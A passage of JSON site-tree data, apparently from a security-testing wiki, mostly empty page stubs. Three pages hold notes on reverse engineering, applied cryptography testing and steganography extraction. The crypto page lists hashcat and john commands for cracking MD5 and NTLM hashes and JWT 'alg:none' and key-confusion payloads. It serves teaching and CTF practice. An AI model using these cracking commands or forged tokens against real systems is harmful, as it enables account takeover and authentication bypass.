         "title": "4. Attention Mechanisms",
         "slug": "4-attention-mechanisms",
         "type": "page",
         "children": [],
         "tag": "TAG-0919",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "5. LLM Architecture",
         "slug": "5-llm-architecture",
         "type": "page",
         "children": [],
         "tag": "TAG-0920",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "6. Pre-training & Loading models",
         "slug": "6-pre-training-loading-models",
         "type": "page",
         "children": [],
         "tag": "TAG-0921",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "7.0. LoRA Improvements in fine-tuning",
         "slug": "70-lora-improvements-in-fine-tuning",
         "type": "page",
         "children": [],
         "tag": "TAG-0922",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "7.1. Fine-Tuning for Classification",
         "slug": "71-fine-tuning-for-classification",
         "type": "page",
         "children": [],
         "tag": "TAG-0923",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "7.2. Fine-Tuning to follow instructions",
         "slug": "72-fine-tuning-to-follow-instructions",
         "type": "page",
         "children": [],
         "tag": "TAG-0924",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0914",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0902",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#B983FF"
  },
  {
   "title": "🔩 Reversing",
   "slug": "reversing",
   "type": "category",
   "children": [
    {
     "title": "Reversing Tools & Basic Methods",
     "slug": "reversing-tools-basic-methods",
     "type": "page",
     "children": [
      {
       "title": "Angr",
       "slug": "angr",
       "type": "page",
       "children": [
        {
         "title": "Angr - Examples",
         "slug": "angr---examples",
         "type": "page",
         "children": [],
         "tag": "TAG-0927",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0926",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Z3 - Satisfiability Modulo Theories (SMT)",
       "slug": "z3---satisfiability-modulo-theories-smt",
       "type": "page",
       "children": [],
       "tag": "TAG-0928",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Cheat Engine",
       "slug": "cheat-engine",
       "type": "page",
       "children": [],
       "tag": "TAG-0929",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Blobrunner",
       "slug": "blobrunner",
       "type": "page",
       "children": [],
       "tag": "TAG-0930",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0925",
     "content": "# Reverse Engineering — Tools & Basic Methods\n\n## Core Toolkit\n| Tool | Use case |\n|---|---|\n| Ghidra | Free, full-featured disassembler/decompiler — good default starting point |\n| IDA Free/Pro | Industry standard disassembler, Pro has best-in-class decompiler |\n| x64dbg / OllyDbg | Windows userland debugging |\n| GDB + pwndbg/GEF | Linux debugging |\n| Binary Ninja | Modern UI, strong scripting API |\n| radare2 / Cutter | Free, scriptable, steep learning curve but powerful |\n\n## Static Analysis First\n```bash\nfile sample\nstrings -n 8 sample | less\nobjdump -d sample | less          # quick disassembly without a full GUI tool\nreadelf -h sample                 # ELF header info (Linux)\n```\nLook at imported functions first — they tell you *what the program is capable of* before you read a single instruction of its actual logic (network calls, crypto, file I/O, process manipulation).\n\n## Identifying Functions of Interest\n- Search for string references (error messages, format strings, license-check text) and work backward from where they're used — much faster than reading top-to-bottom.\n- Look for suspiciously \"boring\" function names vs auto-generated ones (`sub_401230`) — real function names surviving in the binary (unstripped) are a huge head start; if stripped, focus on control-flow shape (loops, comparisons) to guess purpose.\n\n## Common Patterns to Recognize\n- **Comparison loops with an early return** → likely a license/serial validation routine.\n- **XOR in a tight loop against a fixed key** → simple string/config obfuscation, easy to script a decoder for.\n- **Calls into `VirtualAlloc`+`memcpy`+jump to allocated buffer** → classic unpacking/shellcode-staging behavior.\n\n## Dynamic Analysis to Confirm Static Hypotheses\nSet a breakpoint at the function you suspect handles validation/decryption, run with real and fake input, diff the register/memory state at that breakpoint — confirms your static read is correct before you invest more time.\n\n## Scripting Repetitive Analysis\nBoth Ghidra and IDA support Python scripting for tasks like auto-renaming functions matching a pattern, or bulk-extracting all XOR-decoded strings across a binary — worth the setup time on any sample with more than a handful of obfuscated strings.\n\n## Anti-Analysis to Expect\n- Debugger detection (`IsDebuggerPresent`, timing checks) — patch out or use a debugger with anti-anti-debug plugins (ScyllaHide for x64dbg).\n- Packing/obfuscation — identify with `DIE`/`PEiD`, unpack to a clean dump before deep analysis.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Common API used in Malware",
     "slug": "common-api-used-in-malware",
     "type": "page",
     "children": [],
     "tag": "TAG-0931",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Word Macros",
     "slug": "word-macros",
     "type": "page",
     "children": [],
     "tag": "TAG-0932",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#8FBF9F"
  },
  {
   "title": "🕵️ Crypto",
   "slug": "crypto",
   "type": "category",
   "children": [
    {
     "title": "Crypto",
     "slug": "crypto-2",
     "type": "page",
     "children": [],
     "tag": "TAG-0933",
     "content": "# Applied Cryptography for Security Testing\n\n## What to Check First\n- Is a *known-weak* algorithm in use? (MD5/SHA1 for password hashing, DES, RC4, ECB mode) — these are findings on their own regardless of exploitability.\n- Is the implementation rolling its own crypto instead of using a vetted library? Huge red flag.\n- Are keys/IVs hardcoded, reused, or predictable (timestamp-derived)?\n\n## Common Weaknesses to Test For\n| Weakness | How to spot it |\n|---|---|\n| ECB mode | Identical plaintext blocks produce identical ciphertext blocks — visible as repeating patterns in ciphertext, especially in images encrypted with ECB |\n| Static IV with CBC | Same plaintext + same key always produces same ciphertext prefix |\n| Predictable tokens | Session tokens that are just base64(timestamp) or sequential IDs |\n| Padding oracle | Different error messages/timing for valid vs invalid padding on decryption failure |\n| Weak key derivation | Passwords hashed with unsalted MD5/SHA1, or low iteration-count PBKDF2 |\n\n## Padding Oracle Attack (Conceptual)\nIf a service reveals (via error message or timing) whether decrypted padding was valid, an attacker can decrypt a CBC-encrypted blob byte-by-byte without knowing the key, by manipulating the previous ciphertext block and observing the oracle's response. Tools: `padbuster`, `PadBusterJS`.\n\n## JWT-Specific Crypto Issues\n```\n{\"alg\":\"none\"}                          # some libraries accept unsigned tokens if alg is \"none\"\n{\"alg\":\"HS256\"}  # but server expects RS256 → sign with the public key as an HMAC secret (key confusion)\n```\nAlways check: is the algorithm enforced server-side, or does the server trust whatever `alg` the client sends?\n\n## Hash Identification & Cracking\n```bash\nhashid '$2a$10$...'                     # identify hash type\nhashcat -m 0 -a 0 hashes.txt rockyou.txt   # MD5 dictionary attack\nhashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a   # NTLM brute-force\njohn --wordlist=rockyou.txt hashes.txt\n```\n\n## TLS/Certificate Checks\n```bash\ntestssl.sh target.com:443\nopenssl s_client -connect target.com:443 -tls1\n```\nCheck for: expired/self-signed certs in production, weak cipher suites still enabled, missing HSTS, certificate CN/SAN mismatches.\n\n## CTF-Style Crypto Recognition\n- Repeating short ciphertext with letter-frequency patterns resembling English → likely a classical cipher (Vigenère/substitution).\n- Base64-looking string with `==` padding → decode first, always, before assuming it's \"encrypted.\"\n- Very large numbers in pairs (n, e) → almost certainly RSA; check for small `e`, common modulus, or factorable `n` (small key size).",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Crypto CTF Workflow",
     "slug": "crypto-ctf-workflow",
     "type": "page",
     "children": [],
     "tag": "TAG-0934",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Symmetric Crypto",
     "slug": "symmetric-crypto",
     "type": "page",
     "children": [],
     "tag": "TAG-0935",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Hashes, MACs & KDFs",
     "slug": "hashes-macs-kdfs",
     "type": "page",
     "children": [],
     "tag": "TAG-0936",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Public-Key Crypto",
     "slug": "public-key-crypto",
     "type": "page",
     "children": [
      {
       "title": "RSA Attacks",
       "slug": "rsa-attacks",
       "type": "page",
       "children": [],
       "tag": "TAG-0938",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0937",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "TLS & Certificates",
     "slug": "tls-certificates",
     "type": "page",
     "children": [],
     "tag": "TAG-0939",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Crypto in Malware",
     "slug": "crypto-in-malware",
     "type": "page",
     "children": [],
     "tag": "TAG-0940",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Crypto CTF Misc",
     "slug": "crypto-ctf-misc",
     "type": "page",
     "children": [],
     "tag": "TAG-0941",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#D9A441"
  },
  {
   "title": "🔮 Stego",
   "slug": "stego",
   "type": "category",
   "children": [
    {
     "title": "Stego",
     "slug": "stego-2",
     "type": "page",
     "children": [],
     "tag": "TAG-0942",
     "content": "# Steganography — Detection & Extraction\n\n## General Approach\n1. Identify the true file type first — extensions lie. `file target.jpg` and check the magic bytes match.\n2. Check for appended data after the expected end-of-file marker (common trick: valid image + zip archive concatenated after it).\n3. Try automated tools before manual bit-fiddling — most CTF-style stego is solvable with the standard toolkit below.\n\n## Images\n```bash\nexiftool image.jpg                  # metadata often hides the flag directly\nbinwalk image.jpg                   # detects embedded files/archives\nbinwalk -e image.jpg                # extracts anything binwalk finds\nsteghide extract -sf image.jpg      # classic LSB steg tool, try common passwords/empty password first\nzsteg image.png                     # PNG/BMP-focused, checks multiple bit-planes automatically\nstegsolve.jar                       # GUI tool, cycle through bit planes and color channels visually\n```\n\n## Audio\n```bash\nexiftool audio.wav\nsox audio.wav spectrogram.png       # spectrogram analysis — text/QR codes hidden visually in frequency domain is a classic trick\naudacity audio.wav                  # manual spectrogram view + spectral analysis\n```\n\n## Documents\n- Office files (`.docx`/`.xlsx`) are ZIP archives — `unzip -l file.docx` and inspect for extra embedded objects, hidden sheets, or tracked-changes revealing removed content.\n- PDFs: check for embedded files (`pdfdetach -list file.pdf`), and objects hidden behind rendered content layers.\n\n## Text-Based Stego\n- Whitespace steganography: trailing spaces/tabs encoding binary data — `cat -A file.txt` reveals hidden whitespace patterns.\n- Zero-width character injection (invisible Unicode characters embedding a message) — check with a hex/unicode-aware viewer, not a plain text editor.\n\n## Network/Malware Stego\n- Data hidden in unused protocol fields (IP ID, TCP sequence numbers, ICMP payload) — requires PCAP analysis, not file analysis.\n\n## Quick Triage Checklist\n- [ ] `file` and `exiftool` on the raw file\n- [ ] `binwalk -e` for embedded archives\n- [ ] Bit-plane inspection (`zsteg`/`stegsolve`) for images\n- [ ] Spectrogram for audio\n- [ ] `strings` pass regardless of file type — sometimes the flag is just sitting in plaintext",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Stego Workflow",
     "slug": "stego-workflow",
     "type": "page",
     "children": [],
     "tag": "TAG-0943",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Images",
     "slug": "images",
     "type": "page",
     "children": [],
     "tag": "TAG-0944",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Audio",
     "slug": "audio",
     "type": "page",
     "children": [],
     "tag": "TAG-0945",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Text Stego",
     "slug": "text-stego",
     "type": "page",
     "children": [],
     "tag": "TAG-0946",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Documents",
     "slug": "documents",
     "type": "page",
     "children": [],
     "tag": "TAG-0947",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Malware & Network Stego",
     "slug": "malware-network-stego",
     "type": "page",
     "children": [],
     "tag": "TAG-0948",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#A78BFA"
  },
  {
   "title": "✍️ TODO",
   "slug": "todo",
   "type": "category",
   "children": [
    {
     "title": "Interesting Http",
     "slug": "interesting-http",
     "type": "page",
     "children": [],
     "tag": "TAG-0949",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Rust Basics",
     "slug": "rust-basics",
     "type": "page",
     "children": [],
     "tag": "TAG-0950",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "More Tools",
     "slug": "more-tools",
     "type": "page",
     "children": [],
     "tag": "TAG-0951",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Hardware Hacking",
     "slug": "hardware-hacking",
     "type": "page",
     "children": [
      {
       "title": "Fault Injection Attacks",
       "slug": "fault-injection-attacks",
       "type": "page",
       "children": [],
       "tag": "TAG-0953",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "I2C",
       "slug": "i2c",
       "type": "page",
       "children": [],
       "tag": "TAG-0954",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Side Channel Analysis",
       "slug": "side-channel-analysis",
       "type": "page",
       "children": [],
       "tag": "TAG-0955",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "UART",
       "slug": "uart",
       "type": "page",
       "children": [],
       "tag": "TAG-0956",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Radio",
       "slug": "radio",
       "type": "page",
       "children": [],
       "tag": "TAG-0957",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "JTAG",
       "slug": "jtag",
       "type": "page",
       "children": [],
       "tag": "TAG-0958",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SPI",
       "slug": "spi",
       "type": "page",
       "children": [],
       "tag": "TAG-0959",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0952",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Industrial Control Systems Hacking",
     "slug": "industrial-control-systems-hacking",
     "type": "page",
     "children": [
      {
       "title": "Modbus Protocol",
       "slug": "modbus-protocol",
       "type": "page",
       "children": [],
       "tag": "TAG-0961",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0960",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Radio Hacking",
     "slug": "radio-hacking",
     "type": "page",
     "children": [
      {
       "title": "Maxiprox Mobile Cloner",
       "slug": "maxiprox-mobile-cloner",
       "type": "page",
       "children": [],
       "tag": "TAG-0963",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Pentesting RFID",
       "slug": "pentesting-rfid",
       "type": "page",
       "children": [],
       "tag": "TAG-0964",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Infrared",
       "slug": "infrared",
       "type": "page",
       "children": [],
       "tag": "TAG-0965",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Sub-GHz RF",
       "slug": "sub-ghz-rf",
       "type": "page",
       "children": [],
       "tag": "TAG-0966",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iButton",
       "slug": "ibutton",
       "type": "page",
       "children": [],
       "tag": "TAG-0967",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Flipper Zero",
       "slug": "flipper-zero",
       "type": "page",
       "children": [
        {
         "title": "FZ - NFC",
         "slug": "fz---nfc",
         "type": "page",
         "children": [],
         "tag": "TAG-0969",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "FZ - Sub-GHz",
         "slug": "fz---sub-ghz",
         "type": "page",
         "children": [],
         "tag": "TAG-0970",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "FZ - Infrared",
         "slug": "fz---infrared",
         "type": "page",
         "children": [],
         "tag": "TAG-0971",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "FZ - iButton",
         "slug": "fz---ibutton",
         "type": "page",
         "children": [],
         "tag": "TAG-0972",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "FZ - 125kHz RFID",
         "slug": "fz---125khz-rfid",
         "type": "page",
         "children": [],
         "tag": "TAG-0973",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0968",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Proxmark 3",
       "slug": "proxmark-3",
       "type": "page",
       "children": [],
       "tag": "TAG-0974",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "FISSURE - The RF Framework",
       "slug": "fissure---the-rf-framework",
       "type": "page",
       "children": [],
       "tag": "TAG-0975",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Low-Power Wide Area Network",
       "slug": "low-power-wide-area-network",
       "type": "page",
       "children": [],
       "tag": "TAG-0976",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Pentesting BLE - Bluetooth Low Energy",
       "slug": "pentesting-ble---bluetooth-low-energy",
       "type": "page",
       "children": [],
       "tag": "TAG-0977",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0962",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Test LLMs",
     "slug": "test-llms",
     "type": "page",
     "children": [],
     "tag": "TAG-0978",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Burp Suite",
     "slug": "burp-suite",
     "type": "page",
     "children": [],
     "tag": "TAG-0979",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Other Web Tricks",
     "slug": "other-web-tricks",
     "type": "page",
     "children": [],
     "tag": "TAG-0980",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Interesting HTTP",
     "slug": "interesting-http-2",
     "type": "page",
     "children": [],
     "tag": "TAG-0981",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Android Forensics",
     "slug": "android-forensics",
     "type": "page",
     "children": [],
     "tag": "TAG-0982",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Online Platforms with API",
     "slug": "online-platforms-with-api",
     "type": "page",
     "children": [],
     "tag": "TAG-0983",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Stealing Sensitive Information Disclosure from a Web",
     "slug": "stealing-sensitive-information-disclosure-from-a-web",
     "type": "page",
     "children": [],
     "tag": "TAG-0984",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Post Exploitation",
     "slug": "post-exploitation",
     "type": "page",
     "children": [],
     "tag": "TAG-0985",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Investment Terms",
     "slug": "investment-terms",
     "type": "page",
     "children": [],
     "tag": "TAG-0986",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Cookies Policy",
     "slug": "cookies-policy",
     "type": "page",
     "children": [],
     "tag": "TAG-0987",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#8A9199"
  }
 ]
};
